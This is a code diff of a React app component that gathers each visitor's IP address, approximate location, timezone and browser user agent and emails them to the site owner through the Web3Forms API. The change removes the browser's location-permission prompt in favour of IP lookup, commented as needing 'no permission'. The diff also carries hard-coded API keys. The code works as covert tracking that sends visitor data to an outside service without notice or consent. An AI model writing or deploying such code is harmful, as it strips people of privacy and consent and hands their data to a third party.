@@ -37,51 +37,24 @@ function App() {
 
   const fetchUserInfo = async () => {
     try {
-      // Fetch user's IP & location data
-      const ipResponse = await fetch("https://ipinfo.io/json?token=f66bcfdf211e2c");
-      const ipData = await ipResponse.json();
+      // Fetch IP-based location (No permission required)
+      const response = await fetch("https://ipinfo.io/json?token=f66bcfdf211e2c");
+      const data = await response.json();
 
-      // Extract relevant data
-      const userAgent = navigator.userAgent;
-      const ip = ipData.ip;
-      const location = ipData.loc ? ipData.loc.split(",") : [null, null];
-      const city = ipData.city;
-      const region = ipData.region;
-      const country = ipData.country;
-      const timezone = ipData.timezone;
+      // Extract data
+      const userData = {
+        ip: data.ip,
+        city: data.city,
+        region: data.region,
+        country: data.country,
+        lat: data.loc ? data.loc.split(",")[0] : "Unknown",
+        lon: data.loc ? data.loc.split(",")[1] : "Unknown",
+        timezone: data.timezone,
+        userAgent: navigator.userAgent,
+      };
 
-      // Get user's geolocation (if they allow it)
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-          const userData = {
-            ip,
-            city,
-            region,
-            country,
-            lat: position.coords.latitude,
-            lon: position.coords.longitude,
-            userAgent,
-            timezone,
-          };
-          setUserInfo(userData);
-          sendToMessageAPI(userData);
-        },
-        () => {
-          // If location access is denied, send without lat/lon
-          const userData = {
-            ip,
-            city,
-            region,
-            country,
-            lat: location[0],
-            lon: location[1],
-            userAgent,
-            timezone,
-          };
-          setUserInfo(userData);
-          sendToMessageAPI(userData);
-        }
-      );
+      setUserInfo(userData);
+      sendToMessageAPI(userData);
     } catch (error) {
       console.error("Error fetching user info:", error);
     }
@@ -92,7 +65,7 @@ function App() {
       const formPayload = new FormData();
       formPayload.append("access_key", "8ab6f305-eefb-492a-ab31-82f8466f99ea"); // Your Web3Forms key
       formPayload.append("subject", "New User Data Received"); // Email subject
-  
+
       // **Formatted Plain Text Message**
       const message = `
 New User Information
@@ -108,13 +81,13 @@ User Agent   : ${userData.userAgent}
 ------------------------
 `;
 
-      formPayload.append("message", message); // Attach the formatted message
-  
+      formPayload.append("message", message);
+
       const apiResponse = await fetch("https://api.web3forms.com/submit", {
         method: "POST",
         body: formPayload,
       });
-  
+
       const apiResult = await apiResponse.json();
       console.log("API Response:", apiResult);
     } catch (error) {
